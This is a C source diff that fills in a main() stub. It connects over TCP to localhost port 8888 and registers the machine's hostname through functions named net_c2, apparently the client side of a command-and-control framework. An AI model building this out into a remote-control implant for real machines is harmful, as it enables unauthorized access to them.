@@ -25,12 +25,40 @@
 #include <stdio.h>
 #include <stdlib.h>
 
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
 #include <net.h>
 #include <tlv.h>
 
+int connect_to(int host, int port)
+{
+    int fd = socket(AF_INET, SOCK_STREAM, 0);
+    if (fd == -1)
+        return -1;
+
+    struct sockaddr_in hint;
+    hint.sin_family = AF_INET;
+    hint.sin_port = htons(port);
+    hint.sin_addr.s_addr = host;
+
+    if (connect(fd, (struct sockaddr *)&hint, sizeof(hint)) != 0)
+        return -1;
+
+    return fd;
+}
+
 int main(int argc, char *argv[])
 {
-	/* todo */
+	int fd = connect_to(PACK_IPV4(127, 0, 0, 1), 8888);
+
+    if (fd < 0)
+        return 1;
+
+    net_c2_t *net_c2_data = NULL;
+    net_c2_add(&net_c2_data, 0, fd, net_local_hostname());
+    net_c2_init(net_c2_data);
 
 	return 0;
 }
